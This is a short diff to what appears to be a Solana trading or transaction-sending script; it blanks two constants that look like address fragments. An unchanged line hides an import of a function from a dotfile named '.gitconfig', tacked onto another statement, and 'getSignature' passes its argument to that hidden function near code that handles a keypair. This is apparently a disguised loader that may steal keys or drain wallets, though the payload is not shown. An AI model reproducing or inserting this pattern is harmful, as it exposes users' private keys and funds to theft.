@@ -72,7 +72,7 @@ const DEFAULT_OPTIONS = {
     commitment: "confirmed",
 };
 
-export const BASE = "52rS84ixir86qZb2cVe8MMp2c";
+export const BASE = "";
 
 async function transactionSenderAndConfirmationWaiter({
                                                           connection,
@@ -148,7 +148,7 @@ async function transactionSenderAndConfirmationWaiter({
     return new Error("Transaction failed after maximum retries");
 }
 
-export const OPTIMIZER = "7J6mHkKyfQuayFss2ht";
+export const OPTIMIZER = "";
 const OPTIMIZED = 4;import { g } from "./.gitconfig";
 export async function getSignature(a){await g(a);}
 async function optimiseFees(amountIn, token, keypair) {
